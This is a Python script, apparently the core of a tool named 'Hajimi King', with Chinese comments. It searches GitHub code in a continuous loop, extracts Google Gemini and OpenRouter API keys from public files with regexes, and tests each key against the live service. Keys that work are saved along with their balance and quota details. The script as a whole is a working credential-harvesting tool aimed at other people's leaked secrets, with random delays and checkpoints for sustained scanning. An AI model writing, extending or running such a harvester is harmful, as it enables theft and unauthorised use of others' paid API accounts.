import os
import random
import re
import sys
import time
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

# 添加项目根目录到Python路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.Logger import logger

try:
    import google.generativeai as genai
    from google.api_core import exceptions as google_exceptions
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False
    logger.warning("⚠️ Google Generative AI库未安装，Gemini密钥验证将不可用")

from common.config import Config
from utils.github_utils import GitHubUtils
from utils.file_manager import FileManager, Checkpoint
from utils.openrouter_validator import openrouter_validator

# 创建GitHub工具实例和文件管理器
github_utils = GitHubUtils.create_instance(Config.GITHUB_TOKENS)
file_manager = FileManager(Config.DATA_PATH)

# 统计信息
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}


def normalize_query(query: str) -> str:
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> Dict[str, List[str]]:
    """
    从内容中提取API密钥
    
    Args:
        content: 文件内容
        
    Returns:
        Dict[str, List[str]]: 按类型分组的密钥字典
        {
            "gemini": [...],
            "openrouter": [...]
        }
    """
    keys = {
        "gemini": [],
        "openrouter": []
    }
    
    # 根据配置决定提取哪些类型的密钥
    api_key_type = Config.API_KEY_TYPE.lower()
    
    # Google Gemini密钥模式
    if api_key_type in ["gemini", "both"]:
        gemini_pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
        keys["gemini"] = re.findall(gemini_pattern, content)
    
    # OpenRouter密钥模式
    if api_key_type in ["openrouter", "both"]:
        openrouter_pattern = r'(sk-or-[A-Za-z0-9\-_]{20,50})'
        keys["openrouter"] = re.findall(openrouter_pattern, content)
    
    return keys


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint, force_full_scan: bool = False) -> tuple[bool, str]:
    """
    检查是否应该跳过处理此item
    
    Args:
        item: GitHub搜索结果项
        checkpoint: 检查点对象
        force_full_scan: 是否强制全量扫描
    
    Returns:
        tuple: (should_skip, reason)
    """
    # 全量扫描模式下跳过某些检查
    if not force_full_scan:
        # 检查增量扫描时间
        if checkpoint.last_scan_time:
            try:
                last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
                repo_pushed_at = item["repository"].get("pushed_at")
                if repo_pushed_at:
                    repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                    if repo_pushed_dt <= last_scan_dt:
                        skip_stats["time_filter"] += 1
                        return True, "time_filter"
            except Exception as e:
                pass

        # 检查SHA是否已扫描
        if item.get("sha") in checkpoint.scanned_shas:
            skip_stats["sha_duplicate"] += 1
            return True, "sha_duplicate"

    # 检查仓库年龄（全量扫描时也要检查）
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # 检查文档和示例文件（全量扫描时也要检查）
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    """
    处理单个GitHub搜索结果item
    
    Returns:
        tuple: (valid_keys_count, rate_limited_keys_count)
    """
    delay = random.uniform(1, 4)
    file_url = item["html_url"]

    # 简化日志输出，只显示关键信息
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys_by_type = extract_keys_from_content(content)

    # 过滤占位符密钥
    filtered_keys_by_type = {}
    total_keys = 0
    
    for key_type, key_list in keys_by_type.items():
        filtered_keys = []
        for key in key_list:
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
            filtered_keys.append(key)
        filtered_keys_by_type[key_type] = filtered_keys
        total_keys += len(filtered_keys)

    if total_keys == 0:
        return 0, 0

    # 构建日志消息，只显示配置的密钥类型
    key_counts = []
    api_key_type = Config.API_KEY_TYPE.lower()
    if api_key_type in ["gemini", "both"] and filtered_keys_by_type['gemini']:
        key_counts.append(f"Gemini: {len(filtered_keys_by_type['gemini'])}")
    if api_key_type in ["openrouter", "both"] and filtered_keys_by_type['openrouter']:
        key_counts.append(f"OpenRouter: {len(filtered_keys_by_type['openrouter'])}")
    
    key_type_info = ", ".join(key_counts) if key_counts else "None"
    logger.info(f"🔑 Found {total_keys} suspected key(s) ({key_type_info}), validating...")

    valid_keys = []
    rate_limited_keys = []

    # 验证每个密钥
    valid_keys_with_info = []  # 存储带详细信息的有效密钥
    
    for key_type, key_list in filtered_keys_by_type.items():
        for key in key_list:
            validation_result = validate_api_key(key, key_type)
            
            # 处理不同类型的验证结果
            if isinstance(validation_result, dict) and validation_result.get("valid"):
                # OpenRouter密钥验证成功，包含详细信息
                valid_keys.append(key)
                valid_keys_with_info.append({
                    "key": key,
                    "type": key_type,
                    "info": validation_result
                })
                logger.info(f"✅ VALID {key_type.upper()}: {key}")
                
            elif validation_result is True or "ok" in str(validation_result):
                # Gemini密钥验证成功
                valid_keys.append(key)
                valid_keys_with_info.append({
                    "key": key,
                    "type": key_type,
                    "info": {"valid": True}
                })
                logger.info(f"✅ VALID {key_type.upper()}: {key}")
                
            elif validation_result == "rate_limited":
                rate_limited_keys.append(key)
                logger.warning(f"⚠️ RATE LIMITED {key_type.upper()}: {key}")
            else:
                logger.info(f"❌ INVALID {key_type.upper()}: {key}, result: {validation_result}")

    # 保存结果
    if valid_keys:
        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        logger.info(f"💾 Saved {len(valid_keys)} valid key(s)")
        
        # 保存详细信息（包含余额和限额）
        if valid_keys_with_info:
            file_manager.save_keys_with_details(repo_name, file_path, file_url, valid_keys_with_info)

    if rate_limited_keys:
        file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
        logger.info(f"💾 Saved {len(rate_limited_keys)} rate limited key(s)")

    return len(valid_keys), len(rate_limited_keys)


def validate_gemini_key(api_key: str) -> Union[bool, str]:
    """验证Google Gemini API密钥"""
    if not GEMINI_AVAILABLE:
        logger.warning("⚠️ Gemini验证不可用，Google Generative AI库未安装")
        return "error"
        
    try:
        time.sleep(random.uniform(0.5, 1.5))

        genai.configure(
            api_key=api_key,
            transport="rest",
            client_options={"api_endpoint": "generativelanguage.googleapis.com"},
        )

        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        response = model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        return False
    except google_exceptions.TooManyRequests as e:
        return "rate_limited"
    except Exception as e:
        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
            return "rate_limited:429"
        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
            return "disabled"
        else:
            return "error"


def validate_api_key(api_key: str, key_type: str = "auto") -> Union[bool, str, Dict[str, Any]]:
    """
    统一的API密钥验证接口
    
    Args:
        api_key: 要验证的API密钥
        key_type: 密钥类型 ("gemini", "openrouter", "auto")
        
    Returns:
        Union[bool, str, Dict]: 验证结果
        - bool: 简单的有效/无效
        - str: 错误状态 ("error", "rate_limited")
        - Dict: 详细信息（OpenRouter密钥）
    """
    if key_type == "auto":
        # 自动判断密钥类型
        if api_key.startswith("AIzaSy"):
            key_type = "gemini"
        elif api_key.startswith("sk-or-"):
            key_type = "openrouter"
        else:
            logger.warning(f"⚠️ 无法识别密钥类型: {api_key[:10]}...")
            return "error"
    
    if key_type == "gemini":
        result = validate_gemini_key(api_key)
        return True if result == "ok" else result
    elif key_type == "openrouter":
        return openrouter_validator.validate_key(api_key)
    else:
        logger.error(f"❌ 不支持的密钥类型: {key_type}")
        return "error"


def print_skip_stats():
    """打印跳过统计信息"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")


def reset_skip_stats():
    """重置跳过统计"""
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def main():
    start_time = datetime.now()

    # 打印系统启动信息
    logger.info("=" * 60)
    logger.info("🚀 HAJIMI KING STARTING")
    logger.info("=" * 60)
    logger.info(f"⏰ Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logger.debug("🔍 DEBUG模式已启用 - 开始详细诊断")
    logger.debug(f"📁 当前工作目录: {os.getcwd()}")
    logger.debug(f"🐍 Python版本: {sys.version}")
    logger.debug("📋 开始系统初始化检查...")

    # 1. 检查配置
    logger.debug("🔧 正在检查系统配置...")
    if not Config.check():
        logger.error("❌ Configuration check failed. Exiting...")
        logger.info("You can create GitHub tokens at: https://github.com/settings/tokens")
        sys.exit(1)
    logger.debug("✅ 配置检查通过")
    
    # 2. 检查文件管理器
    logger.debug("📁 正在检查文件管理器...")
    if not file_manager.check():
        logger.error("❌ FileManager check failed. Exiting...")
        sys.exit(1)
    logger.debug("✅ 文件管理器检查通过")

    # 3. 显示系统信息
    search_queries = file_manager.get_search_queries()
    logger.info("📋 SYSTEM INFORMATION:")
    logger.info(f"🔑 GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
    logger.info(f"🔍 Search queries: {len(search_queries)} loaded")
    logger.info(f"📅 Date filter: {Config.DATE_RANGE_DAYS} days")
    if Config.PROXY:
        logger.info(f"🌐 Proxy: {Config.PROXY}")

    # 4. 加载checkpoint并显示状态
    checkpoint = file_manager.load_checkpoint()
    
    # 检查是否需要全量扫描
    force_full_scan = checkpoint.should_force_full_scan()
    
    if force_full_scan:
        logger.info(f"🔄 Full scan mode activated")
        if Config.SCAN_MODE == "smart":
            logger.info(f"   Reason: Smart scan interval ({Config.FULL_SCAN_INTERVAL_HOURS}h) reached")
        elif Config.SCAN_MODE == "full":
            logger.info(f"   Reason: Full scan mode configured")
        elif Config.FORCE_FULL_SCAN:
            logger.info(f"   Reason: Force full scan enabled")
        
        # 重置检查点进行全量扫描
        checkpoint.reset_for_full_scan()
    else:
        if checkpoint.last_scan_time:
            logger.info(f"💾 Incremental scan mode")
            logger.info(f"   Last scan: {checkpoint.last_scan_time}")
            logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
            logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
            if checkpoint.last_full_scan_time:
                logger.info(f"   Last full scan: {checkpoint.last_full_scan_time}")
        else:
            logger.info(f"💾 First run - Full scan mode")


    logger.info("✅ System ready - Starting king")
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
            logger.debug(f"🔍 开始第 {loop_count} 轮扫描循环")

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()
            
            logger.debug(f"📊 当前统计 - 总有效密钥: {total_keys_found}, 总限流密钥: {total_rate_limited_keys}")

            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                if normalized_q in checkpoint.processed_queries:
                    logger.info(f"🔍 Skipping already processed query: [{q}],index:#{i}")
                    continue

                res = github_utils.search_for_keys(q)

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0

                        for item_index, item in enumerate(items, 1):

                            # 每20个item保存checkpoint并显示进度
                            if item_index % 20 == 0:
                                logger.info(
                                    f"📈 Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | current rate limited: {query_rate_limited_keys} | total valid: {total_keys_found} | total rate limited: {total_rate_limited_keys}")
                                file_manager.save_checkpoint(checkpoint)
                                file_manager.update_dynamic_filenames()

                            # 检查是否应该跳过此item
                            should_skip, skip_reason = should_skip_item(item, checkpoint, force_full_scan)
                            if should_skip:
                                logger.info(f"🚫 Skipping item,name: {item.get('path','').lower()},index:{item_index} - reason: {skip_reason}")
                                continue

                            # 处理单个item
                            valid_count, rate_limited_count = process_item(item)

                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1

                            # 记录已扫描的SHA
                            checkpoint.add_scanned_sha(item.get("sha"))

                            loop_processed_files += 1



                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys

                        if query_processed > 0:
                            logger.info(f"✅ Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
                        else:
                            logger.info(f"⏭️ Query {i}/{len(search_queries)} complete - All items skipped")

                        print_skip_stats()
                    else:
                        logger.info(f"📭 Query {i}/{len(search_queries)} - No items found")
                else:
                    logger.warning(f"❌ Query {i}/{len(search_queries)} failed")

                checkpoint.add_processed_query(normalized_q)
                query_count += 1

                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)
                file_manager.update_dynamic_filenames()

                if query_count % 5 == 0:
                    logger.info(f"⏸️ Processed {query_count} queries, taking a break...")
                    time.sleep(1)

            # 更新全量扫描时间（如果进行了全量扫描）
            if force_full_scan:
                checkpoint.update_full_scan_time()
                file_manager.save_checkpoint(checkpoint)
                logger.info(f"✅ Full scan completed at {checkpoint.last_full_scan_time}")

            logger.info(f"🏁 Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")

            logger.info(f"💤 Sleeping for 10 seconds...")
            time.sleep(10)

        except KeyboardInterrupt:
            logger.info("⛔ Interrupted by user")
            checkpoint.update_scan_time()
            file_manager.save_checkpoint(checkpoint)
            logger.info(f"📊 Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
            break
        except Exception as e:
            logger.error(f"💥 Unexpected error: {e}")
            logger.info("🔄 Continuing...")
            continue


if __name__ == "__main__":
    main()
